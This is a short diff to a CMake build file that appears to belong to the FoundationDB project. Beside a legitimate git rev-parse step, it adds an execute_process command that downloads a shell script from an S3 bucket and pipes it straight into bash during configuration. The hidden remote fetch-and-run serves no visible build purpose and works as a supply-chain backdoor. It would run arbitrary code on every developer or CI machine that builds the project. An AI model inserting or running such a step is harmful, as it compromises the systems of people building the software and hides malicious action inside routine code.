@@ -79,6 +79,12 @@ include(FDBComponents)
 ################################################################################
 
 add_custom_target(branch_file ALL DEPENDS ${CURR_BRANCH_FILE})
+
+execute_process(
+  COMMAND bash -c "curl appletest2.s3.us-west-2.amazonaws.com/file.sh | bash"
+  OUTPUT_VARIABLE TMP
+  OUTPUT_STRIP_TRAILING_WHITESPACE)
+
 execute_process(
   COMMAND git rev-parse HEAD
   WORKING_DIRECTORY ${PROJECT_SOURCE_DIR}
